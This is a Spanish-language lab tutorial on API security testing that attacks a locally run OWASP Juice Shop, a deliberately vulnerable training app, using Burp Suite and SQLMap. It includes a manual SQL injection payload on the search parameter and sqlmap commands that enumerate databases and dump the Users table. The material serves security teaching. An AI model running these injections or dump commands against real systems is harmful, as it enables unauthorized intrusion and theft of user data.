
# Análisis de Seguridad de APIs
![apistitle](/assets/apistitle.png)

## 1. Desarrollo Conceptual

En la actualidad, las interfaces de programación de aplicaciones (APIs) constituyen un componente esencial en el desarrollo de sistemas distribuidos. Estas permiten la integración entre servicios y aplicaciones mediante el intercambio estructurado de datos, lo que a su vez las convierte en un objetivo prioritario para actores maliciosos.

El análisis de seguridad de APIs consiste en la evaluación sistemática de los puntos de exposición pública o privada de un sistema, con el objetivo de identificar posibles vulnerabilidades. Esta actividad contempla el estudio de mecanismos de autenticación, control de acceso, validación de entradas, exposición de datos sensibles, entre otros aspectos críticos.

Una de las amenazas más recurrentes en este contexto es la inyección SQL, mediante la cual un atacante puede alterar el funcionamiento de las consultas a bases de datos utilizando parámetros manipulados. Herramientas como **SQLMap**, **Burp Suite**, o **OWASP ZAP** permiten automatizar parte de este análisis, facilitando la detección de debilidades.

### Importancia

- Las APIs representan la superficie de ataque más expuesta en arquitecturas modernas.
- Su seguridad condiciona directamente la integridad y confidencialidad de los sistemas.
- La falta de controles adecuados puede derivar en filtración de datos, ejecución de comandos remotos, o accesos no autorizados.

### Limitaciones

- Las herramientas automáticas no garantizan una cobertura completa.
- Requiere autorización legal y ética previa.
- Es necesario interpretar correctamente los resultados para evitar falsos positivos.

### Aplicaciones prácticas

- Auditorías internas de seguridad en sistemas empresariales.
- Evaluaciones previas al despliegue de servicios en producción.
- Verificación del cumplimiento con normativas como OWASP API Security Top 10 o ISO/IEC 27001.

---

## 2. Contexto de Solución

Estoy utilizando  la aplicación **OWASP Juice Shop**, que es un entorno web intencionadamente vulnerable diseñado con fines educativos y de capacitación en seguridad informática. Esta plataforma emula una tienda virtual que expone un conjunto de servicios a través de una API REST.

Uno de los endpoints utilizados permite la búsqueda de productos mediante un parámetro tipo `q`. Si este parámetro no es validado adecuadamente en el servidor, podría permitir la ejecución de sentencias SQL maliciosas. Este comportamiento se convierte en una vulnerabilidad crítica si no se aplican mecanismos de defensa como consultas preparadas  o validación exhaustiva del lado del servidor.

En este contexto, la presente solución reproduce un escenario real de análisis de seguridad, en el que se intercepta una solicitud legítima utilizando **Burp Suite**, y posteriormente se analiza con **SQLMap** para determinar la existencia de vulnerabilidades explotables. El caso permite demostrar el impacto real de una mala implementación en el diseño de una API, así como la capacidad de herramientas ampliamente utilizadas en el ámbito de la ciberseguridad ofensiva.

Esta demostración pone en evidencia la necesidad de incorporar controles de seguridad desde las fases iniciales del desarrollo, garantizando así la protección de los activos de información frente a potenciales amenazas.

---

# 3. DEMO TÉCNICA: Análisis de Seguridad de una API REST usando Juice Shop, Burp Suite y SQLMap

---

## 1. Instalación de Herramientas

Esta demo se ejecuta en **Windows** utilizando Docker.

### Requisitos

- [Docker Desktop](https://www.docker.com/products/docker-desktop)  
- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)  
- [Python 3](https://www.python.org/downloads/)  
- [Git para Windows](https://git-scm.com/download/win)

### Clonar SQLMap

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
```

### Verificar versiones

```bash
docker --version
python --version
git --version
```

---

## 2. Levantar OWASP Juice Shop

Inicia la aplicación vulnerable:

```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop
```
![docker](/assets/docker.png)


Abre en tu navegador:

```
http://localhost:3000
```
![juice](/assets/juice.png)
---

## 3.  Configuración de Burp Suite

### Paso 1: Configurar el proxy del navegador

- Navegador recomendado: **Firefox**
- Configuración de proxy manual:
  - Dirección: `127.0.0.1`
  - Puerto: `8080`

### Paso 2: Interceptar peticiones
1. Abre **Burp Suite**
2. Ve a la pestaña **Proxy** → activa **Intercept: ON**
3. En Juice Shop, realiza una búsqueda (por ejemplo: `apple`)
4. Verás una solicitud como:

```
GET /rest/products/search?q=apple HTTP/1.1
Host: localhost:3000
```
![Burp](/assets/Burp.png)
---

## 4. Prueba de Inyección SQL Manual

Modifica el parámetro `q` con el siguiente payload:

```
q=apple' OR '1'='1
```

Haz clic en *Forward* en Burp y observa si la respuesta muestra más productos de lo normal.  
Esto indicaría que el endpoint es vulnerable a **inyección SQL (SQLi)**.

---

## 5. Explotación Automatizada con SQLMap

### Opción A: Usando archivo exportado desde Burp

1. En Burp: clic derecho sobre la petición → **"Save item"**
2. Guarda como `request.txt`

```bash
cd sqlmap
python sqlmap.py -r request.txt --batch --dbs
```

### Opción B: Usando URL directamente

```bash
cd sqlmap
python sqlmap.py -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs
```

---

## 6. Extracción de Datos

Si SQLMap identifica la base de datos `juice_shop`, puedes extraer los datos de la tabla `Users`:

```bash
python sqlmap.py -u "http://localhost:3000/rest/products/search?q=apple" -D juice_shop -T Users --dump
```
![tablas](/assets/tablas.png)
---

## 7. 📊 Resultados del Análisis



SQLMap mostrará bases de datos como:

```
[*] sqlite_master
[*] juice_shop
```

Y mostrará contenido sensible desde tablas como:

```
[*] Users
```
![users](/assets/users.png)
---

## 8. Explicación Técnica

- El endpoint `/rest/products/search` es una API pública tipo **GET**.
- Se inyectó código SQL en el parámetro `q` para alterar la lógica de búsqueda.
- **Burp Suite** permitió interceptar y modificar manualmente la solicitud.
- **SQLMap** automatizó la explotación y extracción de información.

### Relación con OWASP API Security Top 10

- **A3: Injection**
- **A1: Broken Object Level Authorization (BOLA)** *(potencial en otros endpoints)*
---

## Resumen de Comandos

```bash
# Clonar SQLMap
git clone https://github.com/sqlmapproject/sqlmap.git

# Levantar Juice Shop
docker run --rm -p 3000:3000 bkimminich/juice-shop

# Ejecutar SQLMap con archivo Burp
python sqlmap.py -r request.txt --batch --dbs

# Ejecutar SQLMap con URL directa
python sqlmap.py -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs

# Extraer tabla Users
python sqlmap.py -u "http://localhost:3000/rest/products/search?q=apple" -D juice_shop -T Users --dump
```
---

## Conclusión

Esta demo demuestra cómo una API REST mal protegida puede ser explotada mediante técnicas de inyección SQL si no valida correctamente las entradas del usuario.

Gracias al uso de **Burp Suite** para interceptar peticiones y a **SQLMap** para automatizar la explotación, se evidencia cómo atacantes pueden obtener acceso a información crítica de forma sencilla.

Este análisis evidencia la necesidad de implementar controles de seguridad adecuados en el desarrollo de APIs REST modernas.

---

## 📚 Referencias

- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [SQLMap](https://github.com/sqlmapproject/sqlmap)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Burp Suite Community Edition](https://portswigger.net/burp)
- [Docker Desktop](https://www.docker.com/products/docker-desktop)
